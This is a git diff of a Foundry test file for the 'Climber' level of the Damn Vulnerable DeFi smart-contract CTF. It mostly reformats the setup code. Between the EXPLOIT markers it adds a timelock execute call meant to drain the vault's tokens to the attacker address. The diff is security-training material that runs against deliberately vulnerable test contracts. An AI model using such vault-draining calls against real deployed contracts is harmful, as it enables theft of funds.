@@ -35,7 +35,9 @@ contract Climber is Test {
         proposer = payable(users[1]);
         sweeper = payable(users[2]);
 
-        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
+        attacker = payable(
+            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
+        );
         vm.label(attacker, "Attacker");
         vm.deal(attacker, 0.1 ether);
 
@@ -44,21 +46,39 @@ contract Climber is Test {
         climberImplementation = new ClimberVault();
         vm.label(address(climberImplementation), "climber Implementation");
 
-        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
+        bytes memory data = abi.encodeWithSignature(
+            "initialize(address,address,address)",
+            deployer,
+            proposer,
+            sweeper
+        );
         climberVaultProxy = new ERC1967Proxy(
             address(climberImplementation),
             data
         );
 
-        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);
+        assertEq(
+            ClimberVault(address(climberVaultProxy)).getSweeper(),
+            sweeper
+        );
 
-        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);
+        assertGt(
+            ClimberVault(address(climberVaultProxy))
+                .getLastWithdrawalTimestamp(),
+            0
+        );
 
-        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));
+        climberTimelock = ClimberTimelock(
+            payable(ClimberVault(address(climberVaultProxy)).owner())
+        );
 
-        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));
+        assertTrue(
+            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
+        );
 
-        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));
+        assertTrue(
+            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
+        );
 
         // Deploy token and transfer initial token balance to the vault
         dvt = new DamnValuableToken();
@@ -72,14 +92,29 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        address[] memory targets = new address[](1);
+        targets[0] = address(climberVaultProxy);
+        uint256[] memory values = new uint256[](1);
+        bytes[] memory datas = new bytes[](1);
+
+        values[0] = uint256(0);
+        datas[0] = abi.encodeWithSignature(
+            "withdraw(address,address,uint256)",
+            address(dvt),
+            address(attacker),
+            VAULT_TOKEN_BALANCE
+        );
+        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
         vm.startPrank(attacker);
-        climberTimelock.grantRole(climberTimelock.ADMIN_ROLE(), attacker);
+        climberTimelock.execute(targets, values, datas, salt);
         vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
